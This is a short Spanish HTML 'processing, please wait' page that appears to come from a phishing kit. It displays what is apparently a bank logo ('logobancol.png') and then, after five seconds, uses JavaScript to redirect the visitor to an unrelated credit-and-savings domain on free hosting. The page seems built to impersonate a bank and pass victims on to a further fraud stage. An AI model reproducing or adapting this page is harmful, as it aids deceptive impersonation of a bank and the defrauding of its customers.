<html lang="es"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cargando...</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
        }

        .loader {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .loader .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #3498db;
            border-top: 5px solid transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-top: 20px; /* Espacio entre la imagen y el spinner */
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loader img {
            width: 150px; /* Ajusta el tamaño de la imagen según sea necesario */
        }

        .loader p {
            margin-top: 10px;
            font-size: 18px;
            color: #555;
            text-align: center; /* Centrando el texto */
            max-width: 300px; /* Ancho máximo para el texto */
        }
    </style>
</head>
<body>
    <div class="loader">
        <img src="logobancol.png" alt="Cargando imagen" style="
    margin-bottom: 20px;
">
        <p>Estamos procesando la información. Por favor, espera un momento...</p>
        <div class="spinner"></div>
    </div>

    <script>
        
        setTimeout(() => {
            window.location.href = 'https://creditosahorro24.serv00.net/'; 
        }, 5000); 
    </script>


</body></html>